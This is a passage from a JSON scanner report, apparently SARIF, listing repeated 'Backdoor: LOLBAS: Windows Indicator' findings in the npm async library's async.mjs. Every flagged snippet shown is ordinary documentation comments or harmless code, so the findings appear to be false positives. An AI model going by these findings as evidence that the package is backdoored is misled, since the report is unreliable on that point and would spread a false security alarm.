                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3073,
                  "startColumn": 65,
                  "endLine": 3073,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @alias selectLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} iteratee - A truth test to apply to each item in `coll`.\n * The `iteratee` is passed a `callback(err, truthValue)`, which must be called\n * with a boolean argument once it has completed. Invoked with (item, callback).\n",
                    "rendered": {
                      "text": " * @alias selectLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} iteratee - A truth test to apply to each item in `coll`.\n * The `iteratee` is passed a `callback(err, truthValue)`, which must be called\n * with a boolean argument once it has completed. Invoked with (item, callback).\n",
                      "markdown": "` * @alias selectLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} iteratee - A truth test to apply to each item in `coll`.\n * The `iteratee` is passed a `callback(err, truthValue)`, which must be called\n * with a boolean argument once it has completed. Invoked with (item, callback).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3062,
                  "startColumn": 105,
                  "endLine": 3062,
                  "endColumn": 109,
                  "snippet": {
                    "text": "var filter$1 = awaitify(filter, 3);\n\n/**\n * The same as [`filter`]{@link module:Collections.filter} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name filterLimit\n",
                    "rendered": {
                      "text": "var filter$1 = awaitify(filter, 3);\n\n/**\n * The same as [`filter`]{@link module:Collections.filter} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name filterLimit\n",
                      "markdown": "`var filter$1 = awaitify(filter, 3);\n\n/**\n * The same as [`filter`]{@link module:Collections.filter} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name filterLimit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2924,
                  "startColumn": 95,
                  "endLine": 2924,
                  "endColumn": 99,
                  "snippet": {
                    "text": "var everyLimit$1 = awaitify(everyLimit, 4);\n\n/**\n * The same as [`every`]{@link module:Collections.every} but runs only a single async operation at a time.\n *\n * @name everySeries\n * @static\n",
                    "rendered": {
                      "text": "var everyLimit$1 = awaitify(everyLimit, 4);\n\n/**\n * The same as [`every`]{@link module:Collections.every} but runs only a single async operation at a time.\n *\n * @name everySeries\n * @static\n",
                      "markdown": "`var everyLimit$1 = awaitify(everyLimit, 4);\n\n/**\n * The same as [`every`]{@link module:Collections.every} but runs only a single async operation at a time.\n *\n * @name everySeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2908,
                  "startColumn": 65,
                  "endLine": 2908,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @alias allLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async truth test to apply to each item\n * in the collection in parallel.\n * The iteratee must complete with a boolean result value.\n",
                    "rendered": {
                      "text": " * @alias allLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async truth test to apply to each item\n * in the collection in parallel.\n * The iteratee must complete with a boolean result value.\n",
                      "markdown": "` * @alias allLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async truth test to apply to each item\n * in the collection in parallel.\n * The iteratee must complete with a boolean result value.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2898,
                  "startColumn": 103,
                  "endLine": 2898,
                  "endColumn": 107,
                  "snippet": {
                    "text": "var every$1 = awaitify(every, 3);\n\n/**\n * The same as [`every`]{@link module:Collections.every} but runs a maximum of `limit` async operations at a time.\n *\n * @name everyLimit\n * @static\n",
                    "rendered": {
                      "text": "var every$1 = awaitify(every, 3);\n\n/**\n * The same as [`every`]{@link module:Collections.every} but runs a maximum of `limit` async operations at a time.\n *\n * @name everyLimit\n * @static\n",
                      "markdown": "`var every$1 = awaitify(every, 3);\n\n/**\n * The same as [`every`]{@link module:Collections.every} but runs a maximum of `limit` async operations at a time.\n *\n * @name everyLimit\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2719,
                  "startColumn": 93,
                  "endLine": 2719,
                  "endColumn": 97,
                  "snippet": {
                    "text": "var eachLimit$1 = awaitify(eachLimit, 4);\n\n/**\n * The same as [`each`]{@link module:Collections.each} but runs only a single async operation at a time.\n *\n * Note, that unlike [`each`]{@link module:Collections.each}, this function applies iteratee to each item\n * in series and therefore the iteratee functions will complete in order.\n",
                    "rendered": {
                      "text": "var eachLimit$1 = awaitify(eachLimit, 4);\n\n/**\n * The same as [`each`]{@link module:Collections.each} but runs only a single async operation at a time.\n *\n * Note, that unlike [`each`]{@link module:Collections.each}, this function applies iteratee to each item\n * in series and therefore the iteratee functions will complete in order.\n",
                      "markdown": "`var eachLimit$1 = awaitify(eachLimit, 4);\n\n/**\n * The same as [`each`]{@link module:Collections.each} but runs only a single async operation at a time.\n *\n * Note, that unlike [`each`]{@link module:Collections.each}, this function applies iteratee to each item\n * in series and therefore the iteratee functions will complete in order.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2703,
                  "startColumn": 65,
                  "endLine": 2703,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @alias forEachLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The array index is not passed to the iteratee.\n",
                    "rendered": {
                      "text": " * @alias forEachLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The array index is not passed to the iteratee.\n",
                      "markdown": "` * @alias forEachLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The array index is not passed to the iteratee.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2693,
                  "startColumn": 101,
                  "endLine": 2693,
                  "endColumn": 105,
                  "snippet": {
                    "text": "var each = awaitify(eachLimit$2, 3);\n\n/**\n * The same as [`each`]{@link module:Collections.each} but runs a maximum of `limit` async operations at a time.\n *\n * @name eachLimit\n * @static\n",
                    "rendered": {
                      "text": "var each = awaitify(eachLimit$2, 3);\n\n/**\n * The same as [`each`]{@link module:Collections.each} but runs a maximum of `limit` async operations at a time.\n *\n * @name eachLimit\n * @static\n",
                      "markdown": "`var each = awaitify(eachLimit$2, 3);\n\n/**\n * The same as [`each`]{@link module:Collections.each} but runs a maximum of `limit` async operations at a time.\n *\n * @name eachLimit\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2563,
                  "startColumn": 12,
                  "endLine": 2563,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.doWhilst]{@link module:ControlFlow.doWhilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.doWhilst]{@link module:ControlFlow.doWhilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.doWhilst]{@link module:ControlFlow.doWhilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2517,
                  "startColumn": 12,
                  "endLine": 2517,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - A function which is called each time `test`\n * passes. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - A function which is called each time `test`\n * passes. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - A function which is called each time `test`\n * passes. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2432,
                  "startColumn": 97,
                  "endLine": 2432,
                  "endColumn": 101,
                  "snippet": {
                    "text": "var detectLimit$1 = awaitify(detectLimit, 4);\n\n/**\n * The same as [`detect`]{@link module:Collections.detect} but runs only a single async operation at a time.\n *\n * @name detectSeries\n * @static\n",
                    "rendered": {
                      "text": "var detectLimit$1 = awaitify(detectLimit, 4);\n\n/**\n * The same as [`detect`]{@link module:Collections.detect} but runs only a single async operation at a time.\n *\n * @name detectSeries\n * @static\n",
                      "markdown": "`var detectLimit$1 = awaitify(detectLimit, 4);\n\n/**\n * The same as [`detect`]{@link module:Collections.detect} but runs only a single async operation at a time.\n *\n * @name detectSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2415,
                  "startColumn": 65,
                  "endLine": 2415,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @alias findLimit\n * @category Collections\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A truth test to apply to each item in `coll`.\n * The iteratee must complete with a boolean value as its result.\n * Invoked with (item, callback).\n",
                    "rendered": {
                      "text": " * @alias findLimit\n * @category Collections\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A truth test to apply to each item in `coll`.\n * The iteratee must complete with a boolean value as its result.\n * Invoked with (item, callback).\n",
                      "markdown": "` * @alias findLimit\n * @category Collections\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A truth test to apply to each item in `coll`.\n * The iteratee must complete with a boolean value as its result.\n * Invoked with (item, callback).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2404,
                  "startColumn": 105,
                  "endLine": 2404,
                  "endColumn": 109,
                  "snippet": {
                    "text": "var detect$1 = awaitify(detect, 3);\n\n/**\n * The same as [`detect`]{@link module:Collections.detect} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name detectLimit\n",
                    "rendered": {
                      "text": "var detect$1 = awaitify(detect, 3);\n\n/**\n * The same as [`detect`]{@link module:Collections.detect} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name detectLimit\n",
                      "markdown": "`var detect$1 = awaitify(detect, 3);\n\n/**\n * The same as [`detect`]{@link module:Collections.detect} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name detectLimit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2334,
                  "startColumn": 62,
                  "endLine": 2335,
                  "snippet": {
                    "text": " * result might not be the first item in the original `coll` (in terms of order)\n * that passes the test.\n\n * If order within the original `coll` is important, then look at\n * [`detectSeries`]{@link module:Collections.detectSeries}.\n *\n * @name detect\n * @static\n",
                    "rendered": {
                      "text": " * result might not be the first item in the original `coll` (in terms of order)\n * that passes the test.\n\n * If order within the original `coll` is important, then look at\n * [`detectSeries`]{@link module:Collections.detectSeries}.\n *\n * @name detect\n * @static\n",
                      "markdown": "` * result might not be the first item in the original `coll` (in terms of order)\n * that passes the test.\n\n * If order within the original `coll` is important, then look at\n * [`detectSeries`]{@link module:Collections.detectSeries}.\n *\n * @name detect\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2231,
                  "startColumn": 97,
                  "endLine": 2231,
                  "endColumn": 101,
                  "snippet": {
                    "text": "var concat$1 = awaitify(concat, 3);\n\n/**\n * The same as [`concat`]{@link module:Collections.concat} but runs only a single async operation at a time.\n *\n * @name concatSeries\n * @static\n",
                    "rendered": {
                      "text": "var concat$1 = awaitify(concat, 3);\n\n/**\n * The same as [`concat`]{@link module:Collections.concat} but runs only a single async operation at a time.\n *\n * @name concatSeries\n * @static\n",
                      "markdown": "`var concat$1 = awaitify(concat, 3);\n\n/**\n * The same as [`concat`]{@link module:Collections.concat} but runs only a single async operation at a time.\n *\n * @name concatSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2102,
                  "startColumn": 65,
                  "endLine": 2102,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @category Collection\n * @alias flatMapLimit\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A function to apply to each item in `coll`,\n * which should use an array as its result. Invoked with (item, callback).\n * @param {Function} [callback] - A callback which is called after all the\n",
                    "rendered": {
                      "text": " * @category Collection\n * @alias flatMapLimit\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A function to apply to each item in `coll`,\n * which should use an array as its result. Invoked with (item, callback).\n * @param {Function} [callback] - A callback which is called after all the\n",
                      "markdown": "` * @category Collection\n * @alias flatMapLimit\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A function to apply to each item in `coll`,\n * which should use an array as its result. Invoked with (item, callback).\n * @param {Function} [callback] - A callback which is called after all the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2092,
                  "startColumn": 105,
                  "endLine": 2092,
                  "endColumn": 109,
                  "snippet": {
                    "text": "var mapLimit$1 = awaitify(mapLimit, 4);\n\n/**\n * The same as [`concat`]{@link module:Collections.concat} but runs a maximum of `limit` async operations at a time.\n *\n * @name concatLimit\n * @static\n",
                    "rendered": {
                      "text": "var mapLimit$1 = awaitify(mapLimit, 4);\n\n/**\n * The same as [`concat`]{@link module:Collections.concat} but runs a maximum of `limit` async operations at a time.\n *\n * @name concatLimit\n * @static\n",
                      "markdown": "`var mapLimit$1 = awaitify(mapLimit, 4);\n\n/**\n * The same as [`concat`]{@link module:Collections.concat} but runs a maximum of `limit` async operations at a time.\n *\n * @name concatLimit\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2076,
                  "startColumn": 65,
                  "endLine": 2076,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @see [async.map]{@link module:Collections.map}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with the transformed item.\n",
                    "rendered": {
                      "text": " * @see [async.map]{@link module:Collections.map}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with the transformed item.\n",
                      "markdown": "` * @see [async.map]{@link module:Collections.map}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with the transformed item.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2067,
                  "startColumn": 99,
                  "endLine": 2067,
                  "endColumn": 103,
                  "snippet": {
                    "text": "}\n\n/**\n * The same as [`map`]{@link module:Collections.map} but runs a maximum of `limit` async operations at a time.\n *\n * @name mapLimit\n * @static\n",
                    "rendered": {
                      "text": "}\n\n/**\n * The same as [`map`]{@link module:Collections.map} but runs a maximum of `limit` async operations at a time.\n *\n * @name mapLimit\n * @static\n",
                      "markdown": "`}\n\n/**\n * The same as [`map`]{@link module:Collections.map} but runs a maximum of `limit` async operations at a time.\n *\n * @name mapLimit\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2039,
                  "startColumn": 12,
                  "endLine": 2039,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {...AsyncFunction} functions - the asynchronous functions to compose\n * @returns {Function} an asynchronous function that is the composed\n * asynchronous `functions`\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {...AsyncFunction} functions - the asynchronous functions to compose\n * @returns {Function} an asynchronous function that is the composed\n * asynchronous `functions`\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {...AsyncFunction} functions - the asynchronous functions to compose\n * @returns {Function} an asynchronous function that is the composed\n * asynchronous `functions`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1975,
                  "startColumn": 12,
                  "endLine": 1975,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.compose]{@link module:ControlFlow.compose}\n * @category Control Flow\n * @param {...AsyncFunction} functions - the asynchronous functions to compose\n * @returns {Function} a function that composes the `functions` in order\n * @example\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.compose]{@link module:ControlFlow.compose}\n * @category Control Flow\n * @param {...AsyncFunction} functions - the asynchronous functions to compose\n * @returns {Function} a function that composes the `functions` in order\n * @example\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.compose]{@link module:ControlFlow.compose}\n * @category Control Flow\n * @param {...AsyncFunction} functions - the asynchronous functions to compose\n * @returns {Function} a function that composes the `functions` in order\n * @example\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1794,
